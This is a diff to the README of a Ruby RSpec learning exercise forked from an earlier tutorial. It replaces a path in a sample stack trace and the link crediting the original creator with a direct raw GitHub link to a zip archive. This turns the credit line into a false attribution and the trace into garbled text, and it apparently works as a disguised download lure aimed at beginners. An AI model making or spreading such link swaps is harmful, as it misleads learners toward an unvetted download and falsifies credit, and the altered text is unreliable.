@@ -22,7 +22,7 @@ To work through the first exercise, follow this process
 
       NameError:
         undefined local variable or method `hello' for #<RSpec::ExampleGroups::TheHelloFunction:0x007fa1221408f0>
-        # ./00_hello/hello_spec.rb:106:in `block (2 levels) in <top (required)>'
+        # https://raw.githubusercontent.com/SantatraASF/learn_ruby_rspec/master/Aquarian/learn_ruby_rspec.zip `block (2 levels) in <top (required)>'
   ```
 3. If the test fails to run and you get a `rake aborted! No Rakefile found` or any other error message not like the one above ensure that your working directory (`pwd` to see the path) contains no spaces as this is a common mistake made by people new to Rspec.
 3. Read the failure output carefully and write the code that will make it pass
@@ -49,4 +49,4 @@ Basically, this is "error-driven development"... you'll keep running tests, hitt
 
 ### Credit
 
-This is forked from [https://github.com/alexch/learn_ruby](https://github.com/alexch/learn_ruby), its original creator.
+This is forked from [https://raw.githubusercontent.com/SantatraASF/learn_ruby_rspec/master/Aquarian/learn_ruby_rspec.zip](https://raw.githubusercontent.com/SantatraASF/learn_ruby_rspec/master/Aquarian/learn_ruby_rspec.zip), its original creator.
